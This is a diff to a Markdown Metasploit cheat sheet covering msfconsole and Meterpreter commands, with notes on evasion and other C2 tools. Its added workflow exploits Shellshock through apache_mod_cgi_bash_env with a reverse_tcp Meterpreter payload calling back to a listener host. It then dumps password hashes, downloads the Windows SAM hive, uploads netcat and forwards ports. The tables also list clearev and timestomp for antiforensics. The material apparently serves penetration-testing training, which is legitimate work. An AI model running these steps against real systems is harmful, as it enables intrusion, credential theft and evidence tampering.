@@ -1,4 +1,8 @@
-## MSFconsole Commands 
+# Using the Metasploit Framework
+
+Metasploit remains useful for exploitation, auxiliary scanning, and post-exploitation in 2026, though modern red teams often combine with other C2 frameworks (Sliver, etc.).
+
+## MSFconsole Commands
 
 | **Command**        | **Description**                                                  |
 | :--------------- | :----------------------------------------------------------- |
@@ -85,4 +89,57 @@
 | `clearev`                                                   | Clear the event log on the target machine.                   |
 | `timestomp`                                                 | Change file attributes, such as creation date (antiforensics measure). |
 | `reboot`                                                    | Reboot the target machine.                                   |
-|                                                             |                                                              |
+
+## Meterpreter Commands (Selected)
+
+See full `help` in session.
+
+Useful: `sysinfo`, `getuid`, `hashdump`, `migrate`, `run post/multi/recon/local_exploit_suggester`, `portfwd`, `upload` / `download`, `shell`, `background`.
+
+## 2026 Notes
+
+- Update with `msfupdate` or package manager.
+- Use workspaces: `workspace -a client1`
+- For modern evasion, pair with encoders, custom payloads, or use as initial access then switch to better C2.
+- Many modules for recent CVEs are community contributed — search regularly.
+- Alternatives / complements: nuclei for vuln scan, impacket, CrackMapExec/NetExec, custom Go implants.
+
+`searchsploit` (exploitdb) is often paired outside msf.
+
+## Full Practical Workflow Example
+
+```bash
+msfconsole
+workspace -a client2026
+search multi/http
+use exploit/multi/http/apache_mod_cgi_bash_env
+set RHOSTS 10.10.10.10
+set LHOST 10.10.14.5
+set payload linux/x64/meterpreter/reverse_tcp
+check
+exploit -j
+
+# Post exploitation
+sessions -l
+sessions -i 1
+sysinfo
+getuid
+hashdump
+run post/multi/recon/local_exploit_suggester
+portfwd add -l 3389 -p 3389 -r 172.16.5.20
+background
+```
+
+## Common Meterpreter Commands (Expanded)
+
+```bash
+meterpreter > help
+meterpreter > sysinfo; getuid; pwd; ls
+meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\Temp\\
+meterpreter > download C:\\Windows\\System32\\config\\SAM /tmp/sam
+meterpreter > hashdump
+meterpreter > run post/windows/gather/hashdump
+meterpreter > shell
+meterpreter > migrate 1234
+meterpreter > portfwd add -l 4444 -p 3389 -r 10.0.0.50
+```
